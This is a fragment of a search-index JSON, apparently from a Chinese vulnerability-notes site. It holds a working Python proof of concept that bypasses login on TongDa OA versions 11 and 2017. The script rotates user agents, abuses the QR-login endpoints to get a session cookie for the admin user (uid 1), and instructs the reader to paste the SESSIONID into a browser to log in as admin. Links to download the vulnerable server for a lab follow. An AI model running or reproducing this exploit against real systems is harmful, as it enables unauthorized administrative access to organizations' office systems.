\"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text: if '\u91cd\u65b0\u767b\u5f55' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11\u3001-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1\u3001-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() python3 poc.py -v \u7248\u672c -url url \u8fd0\u884c\u5e76\u83b7\u53d6\u5230\u53ef\u7528\u7684SESSIONID \u66ff\u6362\u6d4f\u89c8\u5668Cookie\u4e2d\u7684SESSIONID\u5373\u53ef\u5b9e\u73b0\u767b\u5f55\u4e3aadmin","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","text":"\u4e0b\u8f7d\u901a\u8fbeOA2017\u7248\u670d\u52a1\u7aef \u00b6 \u901a\u8fbeOA\u73af\u5883\uff1a https://pan.baidu.com/s/16mvDmQpnoYdvz0eJow1sGQ \u63d0\u53d6\u7801: hw33 \u5b89\u88c5\u670d\u52a1\u7aef \u00b6 \u914d\u7f6e\u670d\u52a1 \u00b6 \u767b\u9646 \u00b6 \u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01 \u00b6","title":"\u901a\u8fbeOA2017\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#oa2017","text":"\u901a\u8fbeOA\u73af\u5883\uff1a https://pan.baidu.com/s/16mvDmQpnoYdvz0eJow1sGQ \u63d0\u53d6\u7801: hw33","title":"\u4e0b\u8f7d\u901a\u8fbeOA2017\u7248\u670d\u52a1\u7aef"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_1","text":"","title":"\u5b89\u88c5\u670d\u52a1\u7aef"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_2","text":"","title":"\u914d\u7f6e\u670d\u52a1"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_3","text":"","title":"\u767b\u9646"},{"location":"%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#_4","text":"","title":"\u73af\u5883\u642d\u5efa\u5b8c\u6210\uff01"}]}